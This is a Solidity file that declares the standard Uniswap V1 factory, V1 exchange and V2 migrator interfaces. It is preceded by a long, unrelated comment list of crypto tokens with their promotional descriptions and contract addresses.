// 0x3ebb4a4e91ad83be51f8d596533818b246f4bee1


// Mothership (MSP)
// Cryptocurrency exchange built from the ground up to support cryptocurrency traders with fiat pairs.
// 0x68AA3F232dA9bdC2343465545794ef3eEa5209BD
	

// FLIP (FLP)
// FLIP CRYPTO-TOKEN FOR GAMERS FROM GAMING EXPERTS
// 0x3a1bda28adb5b0a812a7cf10a1950c920f79bcd3


// Fair Token (FAIR)
// Fair.Game is a fair game platform based on blockchain technology.
// 0x9b20dabcec77f6289113e61893f7beefaeb1990a
	

// OCoin (OCN)
// ODYSSEY’s mission is to build the next-generation decentralized sharing economy & Peer to Peer Ecosystem.
// 0x4092678e4e78230f46a1534c0fbc8fa39780892b


// Zloadr Token (ZDR)
// A fully-transparent crypto due diligence token provides banks, investors and financial institutions with free solid researched information; useful and reliable when providing loans, financial assistance or making investment decisions on crypto-backed properties and assets.
// 0xbdfa65533074b0b23ebc18c7190be79fa74b30c2

// Unimex Network (UMX)
// UniMex is a Uniswap based borrowing platform which facilitates the margin trading of native Uniswap assets.
// 0x10be9a8dae441d276a5027936c3aaded2d82bc15


// Vibe Coin (VIBE)
// Crypto Based Virtual / Augmented Reality Marketplace & Hub.
// 0xe8ff5c9c75deb346acac493c463c8950be03dfba
	

// Gro DAO Token (GRO)
// Gro is a stablecoin yield optimizer that enables leverage and protection through risk tranching. It splits yield and risk into two symbiotic products; Gro Vault and PWRD Stablecoin.
// 0x3ec8798b81485a254928b70cda1cf0a2bb0b74d7


// Zippie (ZIPT)
// Zippie enables your business to send and receive programmable payments with money and other digital assets like airtime, loyalty points, tokens and gift cards.
// 0xedd7c94fd7b4971b916d15067bc454b9e1bad980


// Sharpay (S)
// Sharpay is the share button with blockchain profit
// 0x96b0bf939d9460095c15251f71fda11e41dcbddb


// Bundles (BUND)
// Bundles is a DEFI project that challenges token holders against each other to own the most $BUND.
// 0x8D3E855f3f55109D473735aB76F753218400fe96


// ATN (ATN)
// ATN is a global artificial intelligence API marketplace where developers, technology suppliers and buyers come together to access and develop new and innovative forms of A.I. technology.
// 0x461733c17b0755ca5649b6db08b3e213fcf22546


// Empty Set Dollar (ESD)
// ESD is a stablecoin built to be the reserve currency of decentralized finance.
// 0x36F3FD68E7325a35EB768F1AedaAe9EA0689d723


// renDOGE (renDOGE)
// renDOGE is a one-for-one representation of Dogecoin (DOGE) on Ethereum via RenVM.
// 0x3832d2F059E55934220881F831bE501D180671A7


// BOB Token (BOB)
// Using Blockchain to eliminate review fraud and provide lower pricing in the home repair industry through a decentralized platform.
// 0xDF347911910b6c9A4286bA8E2EE5ea4a39eB2134

// Cortex Coin (CTXC)
// Decentralized AI autonomous system.
// 0xea11755ae41d889ceec39a63e6ff75a02bc1c00d

// SpookyToken (BOO)
// SpookySwap is an automated market-making (AMM) decentralized exchange (DEX) for the Fantom Opera network.
// 0x55af5865807b196bd0197e0902746f31fbccfa58

// BZ (BZ)
// Digital asset trading exchanges, providing professional digital asset trading and OTC (Over The Counter) services.
// 0x4375e7ad8a01b8ec3ed041399f62d9cd120e0063

// Adventure Gold (AGLD)
// Adventure Gold is the native ERC-20 token of the Loot non-fungible token (NFT) project. Loot is a text-based, randomized adventure gear generated and stored on-chain, created by social media network Vine co-founder Dom Hofmann.
// 0x32353A6C91143bfd6C7d363B546e62a9A2489A20

// Decentral Games (DG)
// Decentral Games is a community-owned metaverse casino ecosystem powered by DG.
// 0x4b520c812e8430659fc9f12f6d0c39026c83588d

// SENTINEL PROTOCOL (UPP)
// Sentinel Protocol is a blockchain-based threat intelligence platform that defends against hacks, scams, and fraud using crowdsourced threat data collected by security experts; called the Sentinels.
// 0xc86d054809623432210c107af2e3f619dcfbf652

// MATH Token (MATH)
// Crypto wallet.
// 0x08d967bb0134f2d07f7cfb6e246680c53927dd30

// SelfKey (KEY)
// SelfKey is a blockchain based self-sovereign identity ecosystem that aims to empower individuals and companies to find more freedom, privacy and wealth through the full ownership of their digital identity.
// 0x4cc19356f2d37338b9802aa8e8fc58b0373296e7

// RHOC (RHOC)
// The RChain Platform aims to be a decentralized, economically sustainable public compute infrastructure.
// 0x168296bb09e24a88805cb9c33356536b980d3fc5

// THORSwap Token (THOR)
// THORswap is a multi-chain DEX aggregator built on THORChain's cross-chain liquidity protocol for all THORChain services like THORNames and synthetic assets.
// 0xa5f2211b9b8170f694421f2046281775e8468044

// Somnium Space Cubes (CUBE)
// We are an open, social & persistent VR world built on blockchain. Buy land, build or import objects and instantly monetize. Universe shaped entirely by players!
// 0xdf801468a808a32656d2ed2d2d80b72a129739f4

// Parsiq Token (PRQ)
// A Blockchain monitoring and compliance platform.
// 0x362bc847A3a9637d3af6624EeC853618a43ed7D2

// EthLend (LEND)
// Aave is an Open Source and Non-Custodial protocol to earn interest on deposits & borrow assets. It also features access to highly innovative flash loans, which let developers borrow instantly and easily; no collateral needed. With 16 different assets, 5 of which are stablecoins.
// 0x80fB784B7eD66730e8b1DBd9820aFD29931aab03

// QANX Token (QANX)
// Quantum-resistant hybrid blockchain platform. Build your software applications like DApps or DeFi and run business processes on blockchain in 5 minutes with QANplatform.
// 0xaaa7a10a8ee237ea61e8ac46c50a8db8bcc1baaa

// LockTrip (LOC)
// Hotel Booking & Vacation Rental Marketplace With 0% Commissions.
// 0x5e3346444010135322268a4630d2ed5f8d09446c

// BioPassport Coin (BIOT)
// BioPassport is committed to help make healthcare a personal component of our daily lives. This starts with a 'health passport' platform that houses a patient's DPHR, or decentralized personal health record built around DID (decentralized identity) technology.
// 0xc07A150ECAdF2cc352f5586396e344A6b17625EB

// MANTRA DAO (OM)
// MANTRA DAO is a community-governed DeFi platform focusing on Staking, Lending, and Governance.
// 0x3593d125a4f7849a1b059e64f4517a86dd60c95d

// Sai Stablecoin v1.0 (SAI)
// Sai is an asset-backed, hard currency for the 21st century. The first decentralized stablecoin on the Ethereum blockchain.
// 0x89d24a6b4ccb1b6faa2625fe562bdd9a23260359

// Rarible (RARI)
// Create and sell digital collectibles secured with blockchain.
// 0xfca59cd816ab1ead66534d82bc21e7515ce441cf

// BTRFLY (BTRFLY)
// 0xc0d4ceb216b3ba9c3701b291766fdcba977cec3a

// AVT (AVT)
// An open-source protocol that delivers the global standard for ticketing.
// 0x0d88ed6e74bbfd96b831231638b66c05571e824f

// Fusion (FSN)
// FUSION is a public blockchain devoting itself to creating an inclusive cryptofinancial platform by providing cross-chain, cross-organization, and cross-datasource smart contracts.
// 0xd0352a019e9ab9d757776f532377aaebd36fd541

// BarnBridge Governance Token (BOND)
// BarnBridge aims to offer a cross platform protocol for tokenizing risk.
// 0x0391D2021f89DC339F60Fff84546EA23E337750f

// Nuls (NULS)
// NULS is a blockchain built on an infrastructure optimized for customized services through the use of micro-services. The NULS blockchain is a public, global, open-source community project. NULS uses the micro-service functionality to implement a highly modularized underlying architecture.
// 0xa2791bdf2d5055cda4d46ec17f9f429568275047

// Pinakion (PNK)
// Kleros provides fast, secure and affordable arbitration for virtually everything.
// 0x93ed3fbe21207ec2e8f2d3c3de6e058cb73bc04d

// LON Token (LON)
// Tokenlon is a decentralized exchange and payment settlement protocol.
// 0x0000000000095413afc295d19edeb1ad7b71c952

// CargoX (CXO)
// CargoX aims to be the independent supplier of blockchain-based Smart B/L solutions that enable extremely fast, safe, reliable and cost-effective global Bill of Lading processing.
// 0xb6ee9668771a79be7967ee29a63d4184f8097143

// Wrapped NXM (wNXM)
// Blockchain based solutions for smart contract cover.
// 0x0d438f3b5175bebc262bf23753c1e53d03432bde

// Bytom (BTM)
// Transfer assets from atomic world to byteworld
// 0xcb97e65f07da24d46bcdd078ebebd7c6e6e3d750

pragma solidity >=0.5.0;

interface IUniswapV1Factory {
    function getExchange(address) external view returns (address);
}

pragma solidity >=0.5.0;

interface IUniswapV1Exchange {
    function balanceOf(address owner) external view returns (uint);
    function transferFrom(address from, address to, uint value) external returns (bool);
    function removeLiquidity(uint, uint, uint, uint) external returns (uint, uint);
    function tokenToEthSwapInput(uint, uint, uint) external returns (uint);
    function ethToTokenSwapInput(uint, uint) external payable returns (uint);
}

pragma solidity >=0.5.0;

interface IUniswapV2Migrator {
    function migrate(address token, uint amountTokenMin, uint amountETHMin, address to, uint deadline) external;
}